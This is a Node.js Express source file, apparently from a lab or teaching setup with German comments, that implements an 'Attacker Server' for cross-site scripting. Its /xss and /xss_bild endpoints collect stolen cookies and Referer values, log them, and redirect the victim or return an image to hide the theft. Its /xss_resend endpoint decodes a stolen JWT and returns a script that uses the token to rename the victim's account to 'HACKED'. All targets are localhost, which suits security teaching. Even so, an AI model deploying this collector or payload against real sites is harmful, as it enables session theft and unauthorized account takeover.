import express from 'express';
import logCookie from './logger';
import path from 'path';
import { jwtDecode } from "jwt-decode";

const app = express();
const port = 4000;

const brokenImagePath = path.join(__dirname, '../src/img/image.jpeg');


app.get('/xss', (req, res) => {
    // Extrahiert den 'cookie' aus der Anfrage
    const cookieValue = req.query.cookie;
    // Extrahiert den 'Referer'-Header aus der Anfrage
    const referer = req.headers.referer;
    // Prüft, ob sowohl cookieValue als auch referer vorhanden sind
    if (cookieValue && referer) {
        // Cookie-Wert und den Referer in einer Datei speichern
        logCookie(cookieValue.toString(), referer);
        // Loggt den empfangenen Cookie-Wert in der Konsole
        console.log('Received cookie:', cookieValue);
        //Sende den User zurück 
        res.redirect(referer);
    }
});


app.get('/xss_bild', (req, res) => {
    // Extrahiert den 'cookie' aus der Anfrage
    const cookieValue = req.query.cookie;
     // Extrahiert den 'Referer'-Header aus der Anfrage
    const referer = req.headers.referer;
    // Prüft, ob sowohl cookieValue als auch referer vorhanden sind
    if (cookieValue && referer) {
        // Cookie-Wert und den Referer in einer Datei speichern
        logCookie(cookieValue.toString(), referer);
        // Loggt den empfangenen Cookie-Wert in der Konsole
        console.log('Received cookie:', cookieValue);
        // Sendet eine Bilddatei zurück
        res.sendFile(brokenImagePath);
    }
});



app.get('/request', (req, res) => {
    console.log(req)
    res.sendStatus(200)
})

// Ein Skript wird zurück gesendet.
app.get('/xss_resend', (req, res) => {
    const cookieValue = req.query.cookie;
    const referer = req.headers.referer;
    if (cookieValue && referer) {
        logCookie(cookieValue.toString(), referer);
        console.log('Received cookie:', cookieValue);
        let trimcookie= cookieValue.toString().substring("jwt=".length)
        const decode = jwtDecode(trimcookie)
       res.send(`
            <script>
                (function() {
                    fetch("http://localhost:3000/api/user/aendern", {
                        method: "PUT",
                        headers: {
                            "Content-Type": "application/json",
                            "Authorization": "Bearer ${trimcookie}"
                        },
                        body: JSON.stringify({
                            id: "${decode.sub}",
                            name:"HACKED"
                        })
                    }).then(response => {
                        window.location.href = "http://localhost:3000/Profile.html?id=${decode.sub}";
                    }).catch(error => {
                        console.error("Error:", error);
                    });
                })();
            </script>
        `);
    } else {
        res.sendStatus(400);
    }
});

app.get("/", (req, res) => {
    res.send('Attacker Server');
});

app.listen(port, () => {
    console.log(`Attacker server is running on port http://localhost:${port}`);
});
